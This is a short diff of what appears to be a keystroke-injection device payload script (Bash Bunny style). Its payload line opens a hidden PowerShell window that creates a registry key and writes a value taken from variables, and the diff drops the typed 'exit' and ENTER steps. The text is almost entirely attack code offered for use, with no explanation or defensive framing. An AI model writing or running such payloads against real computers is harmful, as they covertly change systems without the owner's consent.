@@ -19,7 +19,5 @@ RUN_DELAY="500"
 # PAYLOAD
 RUN WIN "powershell -WindowStyle Hidden -Command \"New-Item -Path '$REG_PATH' -Force | Out-Null; Set-ItemProperty -Path '$REG_PATH' -Name '$REG_VALUE' -Value '$REG_DATA'\""
 QUACK DELAY $RUN_DELAY
-QUACK "exit"
-QUACK ENTER
 LED FINISH
 LED G
